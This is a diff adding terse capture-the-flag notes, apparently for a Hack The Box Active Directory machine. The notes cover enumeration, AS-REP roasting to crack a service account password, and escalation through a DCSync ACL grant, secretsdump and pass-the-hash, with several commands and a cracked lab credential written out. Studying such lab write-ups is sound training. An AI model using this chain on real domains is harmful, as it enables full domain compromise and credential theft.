@@ -1,0 +1,56 @@
+# keywords
+windows, brute-force, ldap
+
+# init
+## nmap
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain?
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-11 05:38:03Z)
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+
+## 53 DNS
+time out
+
+## 135/445 smb
+enum4linux =>
+index: 0x2369 RID: 0x47e acb: 0x00000210 Account: andy  Name: Andy Hislip       Desc: (null)
+index: 0x2360 RID: 0x47a acb: 0x00000210 Account: lucinda       Name: Lucinda Berger    Desc: (null)
+index: 0x236a RID: 0x47f acb: 0x00000210 Account: mark  Name: Mark Brandt       Desc: (null)
+index: 0x236b RID: 0x480 acb: 0x00000210 Account: santi Name: Santi Rodriguez   Desc: (null)
+index: 0x235c RID: 0x479 acb: 0x00000210 Account: sebastien     Name: Sebastien Caron   Desc: (null)
+
+nbtscan -r 10.10.10.161 => nothing
+smbclient, smbmap => nothing
+
+## 389 ldap/AD
+find user's emails.
+only sebastien has 'lastLogonTimestamp'.
+
+impacket's GetNPUsers.py + hashcat => svc-alfresco:s3rvice
+
+## 5985 WinRM
+evil-winrm = > foothold
+
+# Priv Esc
+## with svc-alfresco
+tried to run SharpHound.ps1, no, use IEX() to bypass.
+
+use bloodhound and found svc-alfresco => use PowerView.ps1 to add us to Exchange Permissions Windows group.
+
+Follow tips in bloodhound help info on edges "writedacl". But add '-PrincipalIdentity' and use impacket-secretdump instead.
+
+Add-DomainObjectAcl -Credential $Cred  -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity zhe -Rights DCSync
+(The target identity is found by Bloodhount)
+impacket-secretsdump htb.local/zhe:zhe0ops@10.10.10.161
+=> dumped admin's lmhash:nthash
+
+pth-winexe => get admin
+
